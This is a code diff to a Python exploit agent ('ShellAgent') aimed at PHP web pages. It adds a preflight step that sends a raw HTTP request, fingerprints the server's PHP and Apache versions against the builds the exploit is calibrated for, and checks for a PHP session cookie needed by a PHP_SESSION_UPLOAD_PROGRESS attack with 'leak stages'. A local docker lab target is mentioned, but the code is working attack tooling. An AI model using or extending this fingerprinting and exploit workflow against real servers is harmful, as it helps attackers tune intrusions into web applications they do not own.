@@ -246,7 +246,8 @@ class ShellAgent:
         r"^(10\.|127\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)")
 
     def preflight(self) -> None:
-        """Fail fast with an actionable message if the target is unreachable."""
+        """Fail fast with an actionable message if the target is unreachable,
+        and fingerprint the page (session cookie, PHP version, Apache build)."""
         host, port = self.t.host, self.t.port
         try:
             s = socket.create_connection((host, port), timeout=8.0)
@@ -259,18 +260,78 @@ class ShellAgent:
                         "(locally: docker compose up --build) or use a publicly "
                         "reachable target URL")
             raise ValueError(f"cannot reach {host}:{port} ({e}){hint}") from e
-        # Probe with the exploit's own HTTP/1.1 client so the result matches
-        # what the exploit will actually see.
+        # Raw GET so we see the response HEADERS (the exploit client's Target.get
+        # only returns status+body, but the headers carry the diagnosis).
         try:
-            status, body = self.t.get(self.t.path)
+            hdr = (f"GET {self.t.path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+                   "Connection: close\r\n\r\n").encode()
+            s = self.t._connect()
+            s.settimeout(self.t.timeout)
+            data = bytearray()
+            try:
+                s.sendall(hdr)
+                while len(data) < (1 << 20):
+                    chunk = s.recv(65536)
+                    if not chunk:
+                        break
+                    data += chunk
+            except OSError:
+                pass
+            finally:
+                s.close()
         except OSError as e:
             raise ValueError(f"HTTP request to {host}:{port} failed ({e})") from e
+        head, _, body = bytes(data).partition(b"\r\n\r\n")
+        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
+        status = int(m.group(1)) if m else 0
         if status == 0:
             raise ValueError(
                 f"TCP open but no HTTP response from {host}:{port} via the exploit "
                 "client - check http:// vs https://, the port, and that the URL "
                 "path points at the PHP page")
         self.log(f"[*] preflight: GET {self.t.path} -> HTTP {status} ({len(body)} bytes)")
+        headers: dict[str, list[str]] = {}
+        for line in head.split(b"\r\n")[1:]:
+            if b":" in line:
+                k, v = line.split(b":", 1)
+                headers.setdefault(k.strip().lower().decode("latin1"),
+                                   []).append(v.strip().decode("latin1"))
+        server = "; ".join(headers.get("server", []))
+        powered = "; ".join(headers.get("x-powered-by", []))
+        setcookies = headers.get("set-cookie", [])
+        if server:
+            self.log(f"[*] preflight: server: {server}")
+        if powered:
+            self.log(f"[*] preflight: powered-by: {powered}")
+            mv = re.search(r"PHP/([\d.]+)", powered)
+            if mv and mv.group(1) != "8.4.26":
+                self.log(f"[-] preflight: target runs PHP {mv.group(1)} but the "
+                         "exploit is calibrated for 8.4.26 - leaks will likely "
+                         "keep failing on this build", "warn")
+        # Apache patch level fingerprints the two calibrated builds
+        if "Apache/2.4.68" in server and self.x.profile == "bookworm":
+            self.log("[!] preflight: Apache/2.4.68 looks like the 'lab' build - "
+                     "select profile=lab (the agent also auto-probes it after "
+                     "3 missed attempts)", "warn")
+        elif "Apache/2.4.69" in server and self.x.profile == "lab":
+            self.log("[!] preflight: Apache/2.4.69 looks like the 'bookworm' "
+                     "build - select profile=bookworm", "warn")
+        if "location" in headers:
+            self.log(f"[*] preflight: redirect -> {headers['location'][0]} "
+                     "(the page that starts the session may be that one)", "warn")
+        if setcookies:
+            names = [c.split("=", 1)[0] for c in setcookies]
+            self.log(f"[*] preflight: session cookie(s): {', '.join(names)}")
+            if not any(n == "PHPSESSID" for n in names):
+                self.log(f"[-] preflight: session cookie name is {names[0]!r}, "
+                         "not PHPSESSID - the exploit expects the default "
+                         "session.name", "warn")
+        else:
+            self.log("[-] preflight: no Set-Cookie on plain GET - this page never "
+                     "starts a PHP session. PHP_SESSION_UPLOAD_PROGRESS needs a "
+                     "page that calls session_start(): point the URL at the app "
+                     "page (e.g. its login page), or set session.auto_start=1",
+                     "warn")
 
     def _leak_diag(self, stage: str) -> None:
         """Explain the most common reasons a leak stage keeps failing."""
